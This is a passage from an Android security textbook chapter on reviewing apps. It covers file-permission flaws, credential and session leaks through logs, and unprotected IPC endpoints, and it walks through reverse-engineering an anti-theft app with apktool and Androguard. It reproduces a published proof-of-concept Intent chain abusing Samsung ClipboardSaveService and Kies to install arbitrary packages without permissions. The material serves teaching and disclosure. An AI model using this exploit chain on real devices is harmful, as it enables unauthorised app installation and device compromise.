insecure fi le permissions were the result\nof a previously less-well publicized issue with native fi le creation on Android.\nSQLite databases, Shared Preferences fi les, and plain fi les created through Java\ninterfaces all used a fi le mode of 0660. This rendered the fi le permissions read/\nwrite for the owning user ID and group ID. However, when any fi les were cre-\nated through native code or external commands, the app process inherited the\numask of its parent process, Zygote—a umask of 000, which means world read/\nwrite. The Skype client used native code for much of its functionality, including\ncreating and interacting with these fi les.\nNOTE As of Android 4.1, the umask for Zygote has been set to a more secure value\nof 077. More information about this change is presented in Chapter 12.\nc04.indd 01:15:7:PM 02/24/2014 Page 87\n88 Chapter 4 ■ Reviewing Application Security\nFor more information on jcase’s discovery in Skype, see www.androidpolice\n.com/2011/04/14/exclusive-vulnerability-in-skype-for-android-is\n-exposing-your-name-phone-number-chat-logs-and-a-lot-more/.\nInformation Leakage Through Logs\nAndroid’s log facility is a great source of information leaks. Through develop-\ners’ gratuitous use of log methods, often for debugging purposes, applications\nmay log anything from general diagnostic messages to login credentials or\nother sensitive data. Even system processes, such as the ActivityManager, log\nfairly verbose messages about Activity invocation. Applications bearing the\nREAD_LOGS permission can obtain access to these log messages (by way of\nthe logcat command).\nNOTE The READ_LOGS permission is no longer available to third-party applications\nas of Android 4.1. However, for older versions, and rooted devices, third-party access\nto this permission and to the logcat command is still possible.\nAs an example of ActivityManager’s logging verbosity, consider the follow-\ning log snippet:\nI/ActivityManager(13738): START {act=android.intent.action.VIEW\ndat=http://www.wiley.com/\ncmp=com.google.android.browser/com.android.browser.BrowserActivity\n(has extras) u=0} from pid 11352\nI/ActivityManager(13738): Start proc com.google.android.browser for\nactivity com.google.android.browser/com.android.browser.BrowserActivity:\npid=11433 uid=10017 gids={3003, 1015, 1028}\nYou see the stock browser being invoked, perhaps by way of the user tapping\na link in an e-mail or SMS message. The details of the Intent being passed are\nclearly visible, and include the URL (http://www.wiley.com/) the user is visit-\ning. Although this trivial example may not seem like a major issue, under these\ncircumstances it presents an opportunity to garner some information about a\nuser’s web-browsing activity.\nA more cogent example of excessive logging was found in the Firefox browser\nfor Android. Neil Bergman reported this issue on the Mozilla bug tracker in\nDecember 2012. Firefox on Android logged browsing activity, including URLs\nthat were visited. In some cases, this included session identifi ers, as Neil pointed\nout in his bug entry and associated output from the logcat command:\nI/GeckoBrowserApp(17773): Favicon successfully loaded for URL =\nhttps://mobile.walmart.com/m/pharmacy;jsessionid=83CB330691854B071CD172D41DC2C3\nAB\nI/GeckoBrowserApp(17773): Favicon is for current URL =\nhttps://mobile.walmart.com/m/pharmacy;jsessionid=83CB330691854B071CD172D41DC2C3\nc04.indd 01:15:7:PM 02/24/2014 Page 88\nChapter 4 ■ Reviewing Application Security 89\nAB\nE/GeckoConsole(17773): [JavaScript Warning: \"Error in parsing value for\n'background'. Declaration dropped.\" {file:\n\"https://mobile.walmart.com/m/pharmacy;jsessionid=83CB330691854B071CD172D41DC2C\n3AB?wicket:bookmarkablePage=:com.wm.mobile.web.rx.privacy.PrivacyPractices\"\nline: 0}]\nIn this case, a malicious application (with log access) could potentially harvest\nthese session identifi ers and hijack the victim’s session on the remote web appli-\ncation. For more details on this issue, see the Mozilla bug tracker at https://\nbugzilla.mozilla.org/show_bug.cgi?id=825685.\nUnsecured IPC Endpoints\nThe common interprocess communication (IPC) endpoints—Services, Activities,\nBroadcastReceivers, and Content Providers—are often overlooked as poten-\ntial attack vectors. As both data sources and sinks, interacting with them is\nhighly dependent on their implementation; and their abuse case dependent on\ntheir purpose. At its most basic level, protection of these interfaces is typically\nachieved by way of app permissions (either standard or custom). For example, an\napplication may defi ne an IPC endpoint that should be accessible only by other\ncomponents in that application or that should be accessible by other applications\nthat request the required permission.\nIn the event that an IPC endpoint is not properly secured, or a malicious app\nrequests—and is granted—the required permission, there are specifi c consider-\nations for each type of endpoint. Content Providers expose access to structured\ndata by design and therefore are vulnerable to a range of attacks, such as injection\nor directory traversal. Activities, as a user-facing component, could potentially\nbe used by a malicious app in a user interface (UI)–redressing attack.\nBroadcast Receivers are often used to handle implicit Intent messages, or\nthose with loose criteria, such as a system-wide event. For instance, the arrival\nof a new SMS message causes the Telephony subsystem to broadcast an implicit\nIntent with the SMS_RECEIVED action. Registered Broadcast Receivers with\nan intent-fi lter matching this action receive this message. However, the priority\nattribute of intent-fi lters (not unique just to Broadcast Receivers) can determine\nthe order in which an implicit Intent is delivered, leading to potential hijacking\nor interception of these messages.\nNOTE Implicit Intents are those without a specifi c destination component, whereas\nexplicit Intents target a particular application and application component (such as\n“com.wiley.exampleapp.SomeActivity”).\nServices, as discussed in Chapter 2, facilitate background processing for an\napp. Similar to Broadcast Receivers and Activities, interaction with Services is\nc04.indd 01:15:7:PM 02/24/2014 Page 89\n90 Chapter 4 ■ Reviewing Application Security\naccomplished using Intents. This includes actions such as starting the service,\nstopping the service, or binding to the service. A bound service may also expose\nan additional layer of application-specifi c functionality to other applications.\nSince this functionality is custom, a developer may be so bold as to expose a\nmethod that executes arbitrary commands.\nA good example of the potential effect of exploiting an unprotected IPC\ninterface is Andre “sh4ka” Moulu’s discovery in the Samsung Kies application\non the Galaxy S3. sh4ka found that Kies, a highly privileged system application\n(including having the INSTALL_PACKAGES permission) had a BroadcastReceiver\nthat restored application packages (APKs) from the /sdcard/restore directory.\nThe following snippet is from sh4ka’s decompilation of Kies:\npublic void onReceive(Context paramContext, Intent paramIntent)\n{\n...\nif (paramIntent.getAction().toString().equals(\n\"com.intent.action.KIES_START_RESTORE_APK\"))\n{\nkies_start.m_nKiesActionEvent = 15;\nint i3 = Log.w(\"KIES_START\",\n\"KIES_ACTION_EVENT_SZ_START_RESTORE_APK\");\nbyte[] arrayOfByte11 = new byte[6];\nbyte[] arrayOfByte12 = paramIntent.getByteArrayExtra(\"head\");\nbyte[] arrayOfByte13 = paramIntent.getByteArrayExtra(\"body\");\nbyte[] arrayOfByte14 = new byte[arrayOfByte13.length];\nint i4 = arrayOfByte13.length;\nSystem.arraycopy(arrayOfByte13, 0, arrayOfByte14, 0, i4);\nStartKiesService(paramContext, arrayOfByte12, arrayOfByte14);\nreturn;\n}\nIn the code you see the onReceive method accepting an Intent, paramIntent.\nThe call to getAction checks that the value of the action fi eld of paramIntent is\nKIES_START_RESTORE_APK. If this is true, the method extracts a few extra values,\nhead and body, from paramIntent and then invokes StartKiesService. The call\nchain ultimately results in Kies iterating through /sdcard/restore, installing\neach APK therein.\nIn order to place his own APK in /sdcard/restore with no permissions, sh4ka\nexploited another issue that yielded the WRITE_EXTERNAL_STORAGE privilege.\nIn his write-up “From 0 perm app to INSTALL_PACKAGES,” sh4ka targeted\nthe ClipboardSaveService on the Samsung GS3. The following code snippet\ndemonstrates this:\nIntent intentCreateTemp = new Intent(\"com.android.clipboardsaveservice.\nCLIPBOARD_SAVE_SERVICE\");\nintentCreateTemp.putExtra(\"copyPath\", \"/data/data/\"+getPackageName()+\n\"/files/avast.apk\");\nc04.indd 01:15:7:PM 02/24/2014 Page 90\nChapter 4 ■ Reviewing Application Security 91\nintentCreateTemp.putExtra(\"pastePath\",\n\"/data/data/com.android.clipboardsaveservice/temp/\");\nstartService(intentCreateTemp);\nHere, sh4ka’s code creates an Intent destined for com.android.clipboardsave-\nservice.CLIPBOARD_SAVE_SERVICE, passing in extras containing the source path\nof his package (in the files directory of his proof-of-concept app’s datastore)\nand the destination path of /sdcard/restore. Finally, the call to startService\nsends this Intent off, and ClipboardService effectively copies the APK to\n/sdcard. All of this happens without the proof-of-concept app holding the\nWRITE_EXTERNAL_STORAGE permission.\nIn the coup de grâce, the appropriate Intent is sent to Kies to gain arbitrary\npackage installation:\nIntent intentStartRestore =\nnew Intent(\"com.intent.action.KIES_START_RESTORE_APK\");\nintentStartRestore.putExtra(\"head\", new String(\"cocacola\").getBytes());\nintentStartRestore.putExtra(\"body\", new String(\"cocacola\").getBytes());\nsendBroadcast(intentStartRestore);\nFor more information on sh4ka’s work, check his blog post at http://sh4ka.\nfr/android/galaxys3/from_0perm_to_INSTALL_PACKAGES_on_galaxy_S3.html.\nCase Study: Mobile Security App\nThis section walks through assessing a mobile security/anti-theft Android\napplication. It introduces tools and techniques for static and dynamic analysis\ntechniques, and you see how to perform some basic reverse engineering. The\ngoal is for you to better understand how to attack particular components in\nthis application, as well as uncover any interesting fl aws that may assist in that\nendeavor.\nProfi ling\nIn the Profi ling phase, you gather some superfi cial information about the tar-\nget application and get an idea of what you’re up against. Assuming you have\nlittle to no information about the application to begin with (sometimes called\nthe “zero-knowledge” or the “black box” approach), it’s important to learn a\nbit about the developer, the application’s dependencies, and any other notable\nproperties it may have. This will help in determining what techniques to employ\nin other phases, and it may even reveal some issues on its own, such as utilizing\na known-vulnerable library or web service.\nFirst, get an idea of the purpose of the application, its developer, and the\ndevelopment history or reviews. Suffi ce it to say that apps with poor security\nc04.indd 01:15:7:PM 02/24/2014 Page 91\n92 Chapter 4 ■ Reviewing Application Security\ntrack records that are published by the same developer may share some issues.\nFigure 4-3 shows some basic information for a mobile device recovery/antitheft\napplication on the Google Play web interface.\nFigure 4-3: Application description in Google Play\nWhen you examine this entry a bit more, you gather that it requests quite\na few permissions. This application, if installed, would be rather privileged\nas far as third-party apps go. By clicking the Permissions tab in the Play\ninterface, you can observe what permissions are being requested, as shown\nin Figure 4-4.\nBased on the description and some of the listed permissions, you can draw a\nfew conclusions. For example, the description mentions remote locking, wiping,\nand audio alerting, which, when combined with the READ_SMS permission,\ncould lead you to believe that SMS is used for out-of-band communications,\nwhich is common among mobile antivirus apps. Make a note that for later,\nbecause it means you might have some SMS receiver code to examine.\nc04.indd 01:15:7:PM 02/24/2014 Page 92\nChapter 4 ■ Reviewing Application Security 93\nFigure 4-4: Some of the permissions requested by the target app\nStatic Analysis\nThe static analysis phase involves analyzing code and data in the application\n(and supporting components) without directly executing the application. At the\noutset, this involves identifying interesting strings, such as hard-coded URIs,\ncredentials, or keys. Following that, you perform additional analyses to con-\nstruct call graphs, ascertain application logic and fl ow, and discover potential\nsecurity issues.\nAlthough the Android SDK provides useful tools such as dexdump to disas-\nsemble classes.dex, you can fi nd other bits of useful information in other fi les\nin the APK. Most of these fi les are in various formats, such as binary XML, and\nc04.indd 01:15:7:PM 02/24/2014 Page 93\n94 Chapter 4 ■ Reviewing Application Security\nmight be diffi cult to read with common tools like grep. Using apktool, which\ncan be found at https://code.google.com/p/android-apktool/, you can con-\nvert these resources into plaintext and also disassemble the Dalvik executable\nbytecode into an intermediate format known as smali (a format which you’ll\nsee more of later).\nRun apktool d with the APK fi le as a parameter to decode the APK’s contents\nand place the fi les in a directory named after the APK:\n~$ apktool d ygib-1.apk\nI: Baksmaling...\nI: Loading resource table...\n...\nI: Decoding values */* XMLs...\nI: Done.\nI: Copying assets and libs...\nNow you can grep for interesting strings like URLs in this application, which\ncould help in understanding communications between this application and a\nweb service. You also use grep to ignore any references to schemas.android\n.com, a common XML namespace string:\n~$ grep -Eir \"https?://\" ygib-1 | grep -v \"schemas.android.com\"\nygib-1/smali/com/yougetitback/androidapplication/settings/xml/\nXmlOperator.smali:\nconst-string v2, \"http://cs1.ucc.ie/~yx2/upload/upload.php\"\nygib-1/res/layout/main.xml: xmlns:ygib=\"http://www.ywlx.net/apk/res/\ncom.yougetitback.androidapplication.cpw.mobile\">\nygib-1/res/values/strings.xml: <string name=\"mustenteremail\">Please enter\na previous email address if you already have an account on\nhttps://virgin.yougetitback.com or a new email address\nif you wish to have a new account to control this device.</string>\nygib-1/res/values/strings.xml: <string name=\"serverUrl\">\nhttps://virgin.yougetitback.com</string>\nygib-1/res/values/strings.xml:Please create an account on\nhttps://virgin.yougetitback.com\nbefore activating this device\"</string>\nygib-1/res/values/strings.xml: <string name=\"showsalocation\">\nhttp://virgin.yougetitback.com/showSALocation?cellid=</string>\nygib-1/res/values/strings.xml: <string name=\"termsofuse\">\nhttps://virgin.yougetitback.com/terms_of_use</string>\nygib-1/res/values/strings.xml: <string name=\"eula\"\n>https://virgin.yougetitback.com/eula</string>\nygib-1/res/values/strings.xml: <string name=\"privacy\">\nhttps://virgin.yougetitback.com/privacy_policy</string>\nygib-1/res/values/strings.xml:\n<string name=\"registration_succeed_text\">\nAccount Registration Successful, you can now use the\nemail address and password entered to log in to your personal vault on\nhttp://virgin.yougetitback.com</string>\nc04.indd 01:15:7:PM 02/24/2014 Page 94\nChapter 4 ■ Reviewing Application Security 95\nygib-1/res/values/strings.xml:\n<string name=\"registrationerror5\">ERROR:creating user account.\nPlease go to http://virgin.yougetitback.com/forgot_password\nwhere you can reset your password, alternatively enter a new\nemail and password on this screen and we will create a new account for you.\nThank You.</string>\nygib-1/res/values/strings.xml: <string name=\"registrationsuccessful\">\nCongratulations you have sucessfully registered.\nYou can now use this email and password provided to\nlogin to your personalised vault on http://virgin.yougetitback.com\n</string>\nygib-1/res/values/strings.xml: <string name=\"link_accessvault\">\nhttps://virgin.yougetitback.com/vault</string>\nygib-1/res/values/strings.xml: <string name=\"text_help\">\nAccess your online vault, or change your password at &lt;a>\nhttps://virgin.yougetitback.com/forgot_password&lt;/a></string>\nAlthough apktool and common UNIX utilities help in a pinch, you need\nsomething a bit more powerful. In this case, call on the Python-based reverse\nengineering and analysis framework Androguard. Although Androguard includes\nutilities suited to specifi c tasks, this chapter focuses on the androlyze tool\nin interactive mode, which gives an IPython shell. For starters, just use the\nAnalyzeAPK method to create appropriate objects representing the APK and its\nresources; the Dex code itself; and also add an option to use the dad decompiler,\nso you can convert back to Java pseudo-source:\n~$ androlyze.py –s\nIn [1]: a,d,dx = AnalyzeAPK(\"/home/ahh/ygib-1.apk\",decompiler=\"dad\")\nNext, gather some additional cursory information about the application,\nnamely to confi rm what you saw while profi ling. This would include things\nsuch as which permissions the application uses, activities the user will most\nlikely interact with, Services that the app runs, and other Intent receivers. Check\nout permissions fi rst, by calling permissions:\nIn [23]: a.permissions\nOut[23]:\n['android.permission.CAMERA',\n'android.permission.CALL_PHONE',\n'android.permission.PROCESS_OUTGOING_CALLS',\n...\n'android.permission.RECEIVE_SMS',\n'android.permission.ACCESS_GPS',\n'android.permission.SEND_SMS',\n'android.permission.READ_SMS',\n'android.permission.WRITE_SMS',\n...\nThese permissions are in line with what you saw when viewing this app in\nGoogle Play. You can go a step further with Androguard and fi nd out which\nc04.indd 01:15:7:PM 02/24/2014 Page 95\n96 Chapter 4 ■ Reviewing Application Security\nclasses and methods in the application actually use these permissions, which\nmight help you narrow your analysis to interesting components:\nIn [28]: show_Permissions(dx)\nACCESS_NETWORK_STATE :\n1 Lcom/yougetitback/androidapplication/PingService;->deviceOnline()Z\n(0x22) ---> Landroid/net/ConnectivityManager;-\n>getAllNetworkInfo()[Landroid/net/NetworkInfo;\n1 Lcom/yougetitback/androidapplication/PingService;->wifiAvailable()Z\n(0x12) ---> Landroid/net/ConnectivityManager;-\n>getActiveNetworkInfo()Landroid/net/NetworkInfo;\n...\nSEND_SMS :\n1 Lcom/yougetitback/androidapplication/ActivateScreen;-\n>sendActivationRequestMessage(Landroid/content/Context;\nLjava/lang/String;)V (0x2) ---> Landroid/telephony/SmsManager;-\n>getDefault()Landroid/telephony/SmsManager;\n1 Lcom/yougetitback/androidapplication/ActivateScreen;\n->sendActivationRequestMessage(Landroid/content/Context;\n...\nINTERNET :\n1 Lcom/yougetitback/androidapplication/ActivationAcknowledgeService;-\n>doPost(Ljava/lang/String; Ljava/lang/String;)Z (0xe)\n---> Ljava/net/URL;->openConnection()Ljava/net/URLConnection;\n1 Lcom/yougetitback/androidapplication/ConfirmPinScreen;->doPost(\nLjava/lang/String; Ljava/lang/String;)Z (0xe)\n---> Ljava/net/URL;->openConnection()Ljava/net/URLConnection;\n...\nAlthough the output was verbose, this trimmed-down snippet shows a few\ninteresting methods, such as the doPost method in the ConfirmPinScreen class,\nwhich must open a socket at some point as it exercises android.permission\n.INTERNET. You can go ahead and disassemble this method to get a handle on\nwhat’s happening by calling show on the target method in androlyze:\nIn [38]: d.CLASS_Lcom_yougetitback_androidapplication_ConfirmPinScreen.\nMETHOD_doPost.show()\n########## Method Information\nLcom/yougetitback/androidapplication/ConfirmPinScreen;-\n>doPost(Ljava/lang/String;\nLjava/lang/String;)Z [access_flags=private]\n########## Params\n- local registers: v0...v10\n- v11:java.lang.String\n- v12:java.lang.String\n- return:boolean\n####################\n************************************************************************\ndoPost-BB@0x0 :\n0 (00000000) const/4 v6, 0\n1 (00000002) const/4 v5, 1 [ doPost-BB@0x4 ]\ndoPost-BB@0x4 :\n2 (00000004) new-instance v3, Ljava/net/URL;\nc04.indd 01:15:7:PM 02/24/2014 Page 96\nChapter 4 ■ Reviewing Application Security 97\n3 (00000008) invoke-direct v3, v11, Ljava/net/URL;-><init>\n(Ljava/lang/String;)V\n4 (0000000e) invoke-virtual v3, Ljava/net/URL;-\n>openConnection()\nLjava/net/URLConnection;\n5 (00000014) move-result-object v4\n6 (00000016) check-cast v4, Ljava/net/HttpURLConnection;\n7 (0000001a) iput-object v4, v10, Lcom/yougetitback/\nandroidapplication/ConfirmPinScreen;->con Ljava/net/HttpURLConnection;\n8 (0000001e) iget-object v4, v10, Lcom/yougetitback/\nandroidapplication/ConfirmPinScreen;->con Ljava/net/HttpURLConnection;\n9 (00000022) const-string v7, 'POST'\n10 (00000026) invoke-virtual v4, v7, Ljava/net/HttpURLConnec-\ntion;\n->setRequestMethod(Ljava/lang/String;)V\n11 (0000002c) iget-object v4, v10, Lcom/yougetitback/\nandroidapplication/ConfirmPinScreen;->con Ljava/net/HttpURLConnection;\n12 (00000030) const-string v7, 'Content-type'\n13 (00000034) const-string v8, 'application/\nx-www-form-urlencoded'\n14 (00000038) invoke-virtual v4, v7, v8, Ljava/net/\nHttpURLConnection;->setRequestProperty(Ljava/lang/String; Ljava/lang/String;)\nV\n15 (0000003e) iget-object v4, v10, Lcom/yougetitback/\nandroidapplication/ConfirmPinScreen;->con Ljava/net/HttpURLConnection;\n...\n31 (00000084) const-string v7, 'User-Agent'\n32 (00000088) const-string v8, 'Android Client'\n...\n49 (000000d4) iget-object v4, v10, Lcom/yougetitback/\nandroidapplication/ConfirmPinScreen;->con Ljava/net/HttpURLConnection;\n50 (000000d8) const/4 v7, 1\n51 (000000da) invoke-virtual v4, v7, Ljava/net/\nHttpURLConnection;\n->setDoInput(Z)V\n52 (000000e0) iget-object v4, v10, Lcom/yougetitback/\nandroidapplication/ConfirmPinScreen;->con Ljava/net/HttpURLConnection;\n53 (000000e4) invoke-virtual v4, Ljava/net/HttpURLConnection;\n->connect()V\nFirst you see some basic information about how the Dalvik VM should handle\nallocation of objects for this method, along with some identifi ers for the method\nitself. In the actual disassembly that follows, instantiation of objects such as\njava.net.HttpURLConnection and invocation of that object’s connect method\nconfi rm the use of the INTERNET permission.\nYou can get a more readable version of this method by decompiling it, which\nreturns output that effectively resembles Java source, by calling source on that\nsame target method:\nIn [39]: d.CLASS_Lcom_yougetitback_androidapplication_ConfirmPinScreen.\nMETHOD_doPost.source()\nprivate boolean doPost(String p11, String p12)\n{\nc04.indd 01:15:7:PM 02/24/2014 Page 97\n98 Chapter 4 ■ Reviewing Application Security\nthis.con = new java.net.URL(p11).openConnection();\nthis.con.setRequestMethod(\"POST\");\nthis.con.setRequestProperty(\"Content-type\",\n\"application/x-www-form-urlencoded\");\nthis.con.setRequestProperty(\"Content-Length\", new\nStringBuilder().append(p12.length()).toString());\nthis.con.setRequestProperty(\"Connection\", \"keep-alive\");\nthis.con.setRequestProperty(\"User-Agent\", \"Android Client\");\nthis.con.setRequestProperty(\"accept\", \"*/*\");\nthis.con.setRequestProperty(\"Http-version\", \"HTTP/1.1\");\nthis.con.setRequestProperty(\"Content-languages\", \"en-EN\");\nthis.con.setDoOutput(1);\nthis.con.setDoInput(1);\nthis.con.connect();\nv2 = this.con.getOutputStream();\nv2.write(p12.getBytes(\"UTF8\"));\nv2.flush();\nandroid.util.Log.d(\"YGIB Test\", new\nStringBuilder(\"con.getResponseCode()—\n>\").append(this.con.getResponseCode()).toString());\nandroid.util.Log.d(\"YGIB Test\", new StringBuilder(\n\"urlString-->\").append(p11).toString());\nandroid.util.Log.d(\"YGIB Test\", new StringBuilder(\"content-->\").\nappend(p12).toString());\n...\nNOTE Note that decompilation isn’t perfect, partly due to diff erences between the\nDalvik Virtual Machine and the Java Virtual Machine. Representation of control and\ndata fl ow in each aff ect the conversion from Dalvik bytecode to Java pseudo-source.\nYou see calls to android.util.Log.d, a method which writes a message to\nthe logger with the debug priority. In this case, the application appears to be\nlogging details of the HTTP request, which could be an interesting information\nleak. You’ll take a look at the log details in action a bit later. For now, see what\nIPC endpoints may exist in this application, starting with activities. For this,\ncall get_activities:\nIn [87]: a.get_activities()\nOut[87]:\n['com.yougetitback.androidapplication.ReportSplashScreen',\n'com.yougetitback.androidapplication.SecurityQuestionScreen',\n'com.yougetitback.androidapplication.SplashScreen',\n'com.yougetitback.androidapplication.MenuScreen',\n...\n'com.yougetitback.androidapplication.settings.setting.Setting',\n'com.yougetitback.androidapplication.ModifyPinScreen',\n'com.yougetitback.androidapplication.ConfirmPinScreen',\nc04.indd 01:15:7:PM 02/24/2014 Page 98\nChapter 4 ■ Reviewing Application Security 99\n'com.yougetitback.androidapplication.EnterRegistrationCodeScreen',\n...\nIn [88]: a.get_main_activity()\nOut[88]: u'com.yougetitback.androidapplication.ActivateSplashScreen'\nUnsurprisingly, this app has numerous activities, including the ConfirmPinScreen\nyou just analyzed. Next, check Services by calling get_services:\nIn [113]: a.get_services()\nOut[113]:\n['com.yougetitback.androidapplication.DeleteSmsService',\n'com.yougetitback.androidapplication.FindLocationService',\n'com.yougetitback.androidapplication.PostLocationService',\n...\n'com.yougetitback.androidapplication.LockAcknowledgeService',\n'com.yougetitback.androidapplication.ContactBackupService',\n'com.yougetitback.androidapplication.ContactRestoreService',\n'com.yougetitback.androidapplication.UnlockService',\n'com.yougetitback.androidapplication.PingService',\n'com.yougetitback.androidapplication.UnlockAcknowledgeService',\n...\n'com.yougetitback.androidapplication.wipe.MyService',\n...\nBased on the naming convention of some of these Services (for example,\nUnlockService and wipe), they will most likely receive and process commands\nfrom other application components when certain events are trigged. Next, look\nat BroadcastReceivers in the app, using get_receivers:\nIn [115]: a.get_receivers()\nOut[115]:\n['com.yougetitback.androidapplication.settings.main.Entrance$MyAdmin',\n'com.yougetitback.androidapplication.MyStartupIntentReceiver',\n'com.yougetitback.androidapplication.SmsIntentReceiver',\n'com.yougetitback.androidapplication.IdleTimeout',\n'com.yougetitback.androidapplication.PingTimeout',\n'com.yougetitback.androidapplication.RestTimeout',\n'com.yougetitback.androidapplication.SplashTimeout',\n'com.yougetitback.androidapplication.EmergencyTimeout',\n'com.yougetitback.androidapplication.OutgoingCallReceiver',\n'com.yougetitback.androidapplication.IncomingCallReceiver',\n'com.yougetitback.androidapplication.IncomingCallReceiver',\n'com.yougetitback.androidapplication.NetworkStateChangedReceiver',\n'com.yougetitback.androidapplication.C2DMReceiver']\nSure enough, you fi nd a Broadcast Receiver that appears to be related to pro-\ncessing SMS messages, likely for out-of-band communications such as locking\nc04.indd 01:15:7:PM 02/24/2014 Page 99\n100 Chapter 4 ■ Reviewing Application Security\nand wiping the device. Because the application requests the READ_SMS permis-\nsion, and you see a curiously named Broadcast Receiver, SmsIntentReceiver,\nchances are good that the application’s manifest contains an Intent fi lter for the\nSMS_RECEIVED broadcast. You can view the contents of AndroidManifest.xml\nin androlyze with just a couple of lines of Python:\nIn [77]: for e in x.getElementsByTagName(\"receiver\"):\nprint e.toxml()\n....:\n...\n<receiver android:enabled=\"true\" android:exported=\"true\" android:name=\n\"com.yougetitback.androidapplication.SmsIntentReceiver\">\n<intent-filter android:priority=\"999\">\n<action android:name=\"android.provider.Telephony.SMS_RECEIVED\">\n</action>\n</intent-filter>\n</receiver>\n...\nNOTE You can also dump the contents of AndroidManifest.xml with one com-\nmand using Androguard’s androaxml.py.\nAmong others, there’s a receiver XML element specifically for the\ncom.yougetitback.androidapplication.SmsIntentReceiver class. This particu-\nlar receiver defi nition includes an intent-filter XML element with an explicit\nandroid:priority element of 999, targeting the SMS_RECEIVED action from the\nandroid.provider.Telephony class. By specifying this priority attribute, the\napplication ensures that it will get the SMS_RECEIVED broadcast fi rst, and thus\naccess to SMS messages before the default messaging application.\nTake a look at the methods available in SmsIntentReceiver by calling\nget_methods on that class. Use a quick Python for loop to iterate through each\nreturned method, calling show_info each time:\nIn [178]: for meth in d.CLASS_Lcom_yougetitback_androidapplication_\nSmsIntentReceiver.get_methods():\nmeth.show_info()\n.....:\n########## Method Information\nLcom/yougetitback/androidapplication/SmsIntentReceiver;-><init>()V\n[access_flags=public constructor]\n########## Method Information\nLcom/yougetitback/androidapplication/SmsIntentReceiver;-\n>foregroundUI(Landroid/content/Context;)V [access_flags=private]\n########## Method Information\nLcom/yougetitback/androidapplication/SmsIntentReceiver;-\n>getAction(Ljava/lang/String;)Ljava/lang/String; [access_flags=private]\n########## Method Information\nLcom/yougetitback/androidapplication/SmsIntentReceiver;-\nc04.indd 01:15:7:PM 02/24/2014 Page 100\nChapter 4 ■ Reviewing Application Security 101\n>getMessagesFromIntent(Landroid/content/Intent;)\n[Landroid/telephony/SmsMessage; [access_flags=private]\nLcom/yougetitback/androidapplication/SmsIntentReceiver;-\n>processBackupMsg(Landroid/content/Context;\nLjava/util/Vector;)V [access_flags=private]\n########## Method Information\nLcom/yougetitback/androidapplication/SmsIntentReceiver;->onReceive\n(Landroid/content/Context; Landroid/content/Intent;)V [access_flags=public]\n...\nFor Broadcast Receivers, the onReceive method serves as an entry point, so\nyou can look for cross-references, or xrefs for short, from that method to get an\nidea of control fl ow. First create the xrefs with d.create_xref and then call\nshow_xref on the object representing the onReceive method:\nIn [206]: d.create_xref()\nIn [207]: d.CLASS_Lcom_yougetitback_androidapplication_SmsIntentReceiver.\nMETHOD_onReceive.show_xref()\n########## XREF\nT: Lcom/yougetitback/androidapplication/SmsIntentReceiver;\nisValidMessage (Ljava/lang/String; Landroid/content/Context;)Z 6c\nT: Lcom/yougetitback/androidapplication/SmsIntentReceiver;\nprocessContent (Landroid/content/Context; Ljava/lang/String;)V 78\nT: Lcom/yougetitback/androidapplication/SmsIntentReceiver;\ntriggerAppLaunch (Landroid/content/Context; Landroid/telephony/SmsMessage;)\nV 9a\nT: Lcom/yougetitback/androidapplication/SmsIntentReceiver;\ngetMessagesFromIntent (Landroid/content/Intent;)\n[Landroid/telephony/SmsMessage; 2a\nT: Lcom/yougetitback/androidapplication/SmsIntentReceiver; isPinLock\n(Ljava/lang/String; Landroid/content/Context;)Z 8a\n####################\nYou see that onReceive calls a few other methods, including ones that appear\nto validate the SMS message and parse content. Decompile and investigate a\nfew of these, starting with getMessageFromIntent:\nIn [213]: d.CLASS_Lcom_yougetitback_androidapplication_SmsIntentReceiver.\nMETHOD_getMessagesFromIntent.source()\nprivate android.telephony.SmsMessage[]\ngetMessagesFromIntent(android.content.Intent p9)\n{\nv6 = 0;\nv0 = p9.getExtras();\nif (v0 != 0) {\nv4 = v0.get(\"pdus\");\nv5 = new android.telephony.SmsMessage[v4.length];\nv3 = 0;\nwhile (v3 < v4.length) {\nv5[v3] = android.telephony.SmsMessage.createFromPdu(v4[v3]);\nv3++;\nc04.indd 01:15:7:PM 02/24/2014 Page 101\n102 Chapter 4 ■ Reviewing Application Security\n}\nv6 = v5;\n}\nreturn v6;\n}\nThis is fairly typical code for extracting an SMS Protocol Data Unit (PDU)\nfrom an Intent. You see that the parameter p9 to this method contains the Intent\nobject. v0 is populated with the result of p9.getExtras, which includes all the\nextra objects in the Intent. Next, v0.get(\"pdus\") is called to extract just the PDU\nbyte array, which is placed in v4. The method then creates an SmsMessage object\nfrom v4, assigns it to v5, and loops while populating members of v5. Finally, in\nwhat might seem like a strange approach (likely due to the decompilation pro-\ncess), v6 is also assigned as the SmsMessage object v5, and returned to the caller.\nDecompiling the onReceive method, you see that prior to calling\ngetMessagesFromIntent, a Shared Preferences fi le, SuperheroPrefsFile, is\nloaded. In this instance, the p8 object, representing the application’s Context or\nstate, has getSharedPreferences invoked. Thereafter, some additional methods\nare called to ensure that the SMS message is valid (isValidMessage), and ulti-\nmately the content of the message is processed (processContent), all of which\nseem to receive the p8 object as a parameter. It’s likely that SuperheroPrefsFile\ncontains something relevant to the operations that follow, such as a key or PIN:\nIn [3]: d.CLASS_Lcom_yougetitback_androidapplication_SmsIntentReceiver.\nMETHOD_onReceive.source()\npublic void onReceive(android.content.Context p8,\nandroid.content.Intent p9)\n{\np8.getSharedPreferences(\"SuperheroPrefsFile\", 0);\nif (p9.getAction().equals(\"\nandroid.provider.Telephony.SMS_RECEIVED\") != 0) {\nthis.getMessagesFromIntent(p9);\nif (this != 0) {\nv1 = 0;\nwhile (v1 < this.length) {\nif (this[v1] != 0) {\nv2 = this[v1].getDisplayMessageBody();\nif ((v2 != 0) && (v2.length() > 0)) {\nandroid.util.Log.i(\"MessageListener:\", v2);\nthis.isValidMessage(v2, p8);\nif (this == 0) {\nthis.isPinLock(v2, p8);\nif (this != 0) {\nthis.triggerAppLaunch(p8, this[v1]);\nthis.abortBroadcast();\n}\n} else {\nthis.processContent(p8, v2);\nthis.abortBroadcast();\n...\nc04.indd 01:15:7:PM 02/24/2014 Page 102\nChapter 4 ■ Reviewing Application Security 103\nSupposing you want to construct a valid SMS message to be processed by\nthis application, you’d probably want to take a look at isValidMessage, which\nyou see in the preceding code receives a string pulled from the SMS message\nvia getDisplayMessageBody, along with the current app context. Decompiling\nisValidMessage gives you a bit more insight into this app:\nprivate boolean isValidMessage(String p12, android.content.Context p13)\n{\nv5 = p13.getString(1.82104701918e+38);\nv0 = p13.getString(1.821047222e+38);\nv4 = p13.getString(1.82104742483e+38);\nv3 = 